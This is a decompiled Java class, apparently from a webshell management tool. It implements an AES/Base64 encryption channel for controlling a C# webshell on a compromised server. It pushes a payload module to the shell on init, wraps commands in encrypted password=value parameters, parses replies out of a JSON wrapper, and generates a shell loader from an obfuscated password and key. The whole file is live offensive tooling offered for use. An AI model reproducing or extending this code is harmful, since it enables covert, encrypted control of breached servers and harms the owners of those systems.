//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.cshapAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(
        Name = "CSHAP_AES_BASE64_DATA",
        payloadName = "CShapDynamicPayload"
)
public class CShapAesBase64data implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String findStrLeft;
    private String pass;
    private String findStrRight;

    public CShapAesBase64data() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + this.key);
        this.findStrLeft = "{\"data\":\"";
        this.findStrRight = "\"}";

        try {
            this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Exception e = var4;
            Log.error(e);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception var3) {
            Exception e = var3;
            Log.error(e);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Exception e = var3;
            Log.error(e);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    public boolean isSendRLData() {
        return true;
    }

    public boolean check() {
        return this.state;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoderdata(functions.base64EncodeToString(functions.base64EncodeToString(functions.base64EncodeToString(password.getBytes()).getBytes()).getBytes()), functions.md5(secretKey).substring(0, 16) ,this.getClass().getSimpleName());
    }

}
